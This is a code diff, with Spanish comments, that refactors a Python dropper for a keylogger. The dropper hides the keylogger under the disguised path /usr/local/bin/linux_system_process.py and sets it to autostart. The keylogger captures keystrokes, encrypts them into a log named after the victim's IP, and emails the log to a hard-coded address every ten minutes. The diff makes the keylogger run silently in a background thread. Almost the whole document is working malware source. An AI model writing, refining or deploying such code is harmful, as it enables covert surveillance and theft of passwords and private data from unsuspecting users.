@@ -41,20 +41,7 @@ import netifaces
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
-
-try:
-    # Ejecutar el keylogger en segundo plano, redirigiendo stdout y stderr a /dev/null
-    keylogger_thread = threading.Thread(target=lambda: subprocess.Popen(
-        ['python3', dest_path],
-        stdout=subprocess.DEVNULL,  # Redirigir salida estándar a /dev/null
-        stderr=subprocess.DEVNULL,  # Redirigir salida de error a /dev/null
-        preexec_fn=os.setpgrp  # Desvincular del terminal
-    ))
-    keylogger_thread.start()
-    #print("Keylogger executed immediately.")
-except Exception as e:
-    #print(f"Failed to execute the keylogger: {e}")
-    exit(1)
+import threading
 
 # Generar clave de cifrado
 key = Fernet.generate_key()
@@ -74,8 +61,8 @@ def get_ip_address():
     except Exception as e:
         return "unknown"
 
-# Crear archivo de log con la IP de la víctima y la fecha/hora actual
-log_file = os.path.join(log_dir, f"keylog_{get_ip_address()}_{int(time.time())}.log")
+# Crear archivo de log usando solo la IP de la víctima
+log_file = os.path.join(log_dir, f"{get_ip_address()}.log")
 
 # Función para guardar las teclas encriptadas
 def log_key_press(key):
@@ -84,9 +71,10 @@ def log_key_press(key):
             encrypted_key = cipher.encrypt(str(key).encode())
             log.write(encrypted_key + b"\\n")
     except Exception as e:
-        print(f"Failed to log key: {e}")
+        #print(f"Failed to log key: {e}")
+        exit(1)
 
-# Función para enviar el log por correo y eliminarlo
+# Función para enviar el log por correo y vaciarlo
 def send_log_via_email(log_path, email_from, password, email_to):
     msg = MIMEMultipart()
     msg['From'] = email_from
@@ -106,25 +94,39 @@ def send_log_via_email(log_path, email_from, password, email_to):
         server.login(email_from, password)
         server.sendmail(email_from, email_to, msg.as_string())
         server.quit()
-        os.remove(log_path)
+
+        # En lugar de eliminar el archivo, lo vaciamos
+        with open(log_path, 'w') as log_file:
+            log_file.write('')
     except Exception as e:
         print(f"Failed to send email: {e}")
 
-# Escuchar las pulsaciones de teclado
-def start_listener():
-    with Listener(on_press=log_key_press) as listener:
-        listener.join()
+# Función principal que ejecuta todo en segundo plano
+def keylogger_thread_function():
+    # Escuchar las pulsaciones de teclado
+    def start_listener():
+        with Listener(on_press=log_key_press) as listener:
+            listener.join()
 
-# Iniciar el listener en un hilo separado
-import threading
-listener_thread = threading.Thread(target=start_listener)
-listener_thread.start()
+    # Iniciar el listener en un hilo separado para la captura de teclas
+    listener_thread = threading.Thread(target=start_listener)
+    listener_thread.start()
 
-# Enviar el log cada 10 minutos
-while True:
-    time.sleep(600)  # Esperar 10 minutos
-    if os.path.exists(log_file):
-        send_log_via_email(log_file, "send_email@gmail.com", "password", "recipient_email@gmail.com")'''
+    # Bucle para enviar el log cada 10 minutos
+    while True:
+        time.sleep(600)  # Esperar 10 minutos
+        if os.path.exists(log_file):
+            send_log_via_email(log_file, "senderemail@gmail.com", "password", "recipientemail@gmail.com")
+
+# Ejecutar el keylogger en segundo plano
+try:
+    keylogger_thread = threading.Thread(target=keylogger_thread_function)
+    keylogger_thread.start()
+    # El keylogger ya se está ejecutando en segundo plano, y el hilo principal no está bloqueado
+except Exception as e:
+    #print(f"Failed to execute the keylogger: {e}")
+    exit(1)
+'''
 
     dest_path = "/usr/local/bin/linux_system_process.py"
     try:
@@ -135,6 +137,7 @@ while True:
     except Exception as e:
         #print(f"Failed to copy the keylogger: {e}")
         exit(1)
+
 
 # Función para configurar el script en el arranque del sistema
 def setup_autostart():
